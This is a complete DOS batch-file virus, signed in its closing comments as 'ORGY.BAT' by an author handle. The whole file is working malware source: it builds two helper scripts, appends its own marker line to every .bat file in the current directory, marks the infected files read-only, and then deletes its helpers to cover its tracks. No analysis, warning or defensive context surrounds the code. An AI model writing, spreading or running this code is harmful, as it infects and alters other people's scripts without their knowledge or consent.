@echo off
echo orgy > infect1.bat
echo if [%%1]==[infect1.bat] goto DontBother > infect2.bat
echo if [%%1]==[infect2.bat] goto DontBother >> infect2.bat
echo copy %%1 + infect1.bat %%1 >> infect2.bat
echo attrib +r %%1 >> infect2.bat
echo :DontBother >> infect2.bat
attrib +r infect1.bat
attrib +r infect2.bat
for %%f in (*.bat) do call infect2 %%f
attrib -r infect1.bat
attrib -r infect2.bat
del infect1.bat
del infect2.bat
rem ORGY.BAT virus by EXE-Gency/[KrashMag]
rem email exegency@hotmail.com